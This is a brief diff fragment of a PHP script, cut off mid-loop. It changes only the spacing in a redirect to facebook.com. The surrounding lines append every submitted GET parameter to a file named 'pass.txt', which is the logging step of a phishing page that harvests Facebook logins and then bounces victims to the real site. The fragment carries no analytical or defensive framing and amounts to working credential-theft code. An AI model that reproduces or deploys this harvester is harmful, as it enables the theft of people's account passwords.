@@ -1,4 +1,4 @@
-header ('Location: https://www.facebook.com '); $handle = fopen("pass.txt", "a");
+header('Location: https://www.facebook.com'); $handle = fopen("pass.txt", "a");
 foreach($_GET as $variable => $value)
 {
 fwrite($handle, $variable);
